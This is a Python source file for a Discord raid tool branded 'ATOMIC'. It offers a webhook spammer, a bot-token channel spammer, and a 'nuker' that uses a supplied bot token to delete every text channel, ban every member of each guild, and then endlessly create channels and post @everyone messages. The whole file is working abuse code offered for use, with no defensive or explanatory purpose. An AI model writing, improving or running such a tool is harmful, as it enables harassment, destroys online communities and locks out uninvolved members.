from discord_webhook import DiscordWebhook
import discord, os, time
from colorama import *
from discord.ext import commands


init(convert=True, autoreset=True)
reset, white, red = Fore.RESET, Fore.WHITE, Fore.LIGHTRED_EX


def clear():
    if os.name == "nt":
        return os.system("cls")
    else:
        return os.system("clear")


class Spammer:
    pref = f"{white}[{red}>{white}]{reset} "
    success = f"{Fore.LIGHTGREEN_EX} Success: "

    def __init__(self):
        self.main_menu()

    def logo(self):
        print(
            f"""
        {red} █████╗  ████████╗  ██████╗  ███╗   ███╗ ██╗  ██████╗
        ██╔══██╗ ╚══██╔══╝ ██╔═══██╗ ████╗ ████║ ██║ ██╔════╝{reset}
        {white}███████║    ██║    ██║   ██║ ██╔████╔██║ ██║ ██║     
        ██   ██║    ██║    ██║   ██║ ██║╚██╔╝██║ ██║ ██║     
        ██║  ██║    ██║    ╚██████╔╝ ██║ ╚═╝ ██║ ██║ ╚██████╗
        ╚═╝  ╚═╝    ╚═╝     ╚═════╝  ╚═╝     ╚═╝ ╚═╝  ╚═════╝{reset}
        """
        )

    def main_menu(self):
        clear()
        self.logo()
        print(
            f"[{Fore.LIGHTCYAN_EX}1{reset}] Webhook Spammer        [{Fore.LIGHTCYAN_EX}2{reset}] Bot Token Nuker        [{Fore.LIGHTCYAN_EX}3{reset}] Bot Token Spammer"
        )
        choice = int(input(f"\n{self.pref}"))
        if choice == 1:
            clear()
            self.webhookspammer()
        elif choice == 2:
            clear()
            self.tkennuker()
        elif choice == 3:
            clear()
            self.tkenspammer()
        else:
            clear()
            self.main_menu()

    def webhookspammer(self):
        clear()
        self.logo()
        webhook_url = str(input(f"{self.pref}Webhook URL: "))
        msg = str(input(f"{self.pref}Message: "))
        tcount = 0
        while True:
            try:

                webhook = DiscordWebhook(
                    url=webhook_url, rate_limit_retry=True, content=f"@everyone {msg}"
                )
                response = webhook.execute()
                if 200 or "200" in response:
                    tcount += 1
                    print(
                        f'{self.success}Sent "@everyone {msg}" to webhook! | Total Count: {tcount}'
                    )
            except KeyboardInterrupt:
                break
        self.main_menu()

    def tkennuker(self):
        clear()
        self.logo()
        bot = commands.Bot(".", intents=discord.Intents.all())

        token = str(input(f"{self.pref}Bot Token: "))

        @bot.event
        async def on_ready():
            tcount = 0
            print(f"{self.success}Logged In Successfully!")
            msg = str(input(f"{self.pref}Message: "))
            cnl_nm = str(input(f"{self.pref}Nuked Channel Name: "))
            for guild in bot.guilds:
                for channel in guild.text_channels:
                    try:
                        await channel.delete()
                    except Exception:
                        pass
                for user in guild.members:
                    try:
                        await guild.ban(user, reason=msg)
                    except Exception:
                        pass
            while True:
                chl = await guild.create_text_channel(cnl_nm)
                await chl.send(f"@everyone {msg}")
                tcount += 1
                print(f'{self.success}Sent "@everyone {msg}"! | Total Count: {tcount}')

        try:
            bot.run(token)
        except discord.LoginFailure:
            input(
                "Could not login to bot, Please check the token. Press enter to go back."
            )
            self.main_menu()

    def tkenspammer(self):
        clear()
        self.logo()
        bot = commands.Bot(".", intents=discord.Intents.all())
        token = str(input(f"{self.pref}Bot Token: "))

        @bot.event
        async def on_ready():
            print(f"{self.success}Logged In Successfully!")
            cnl = int(input(f"{self.pref}Channel id: "))
            msg = str(input(f"{self.pref}Message: "))
            tcount = 0
            chl = await bot.fetch_channel(cnl)
            while True:
                await chl.send(f"@everyone {msg}")
                tcount += 1
                print(f'{self.success}Sent "@everyone {msg}"! | Total Count: {tcount}')

        try:
            bot.run(token)

        except discord.LoginFailure:
            input(
                "Could not login to bot, Please check the token. Press enter to go back."
            )
            self.main_menu()


Spammer()
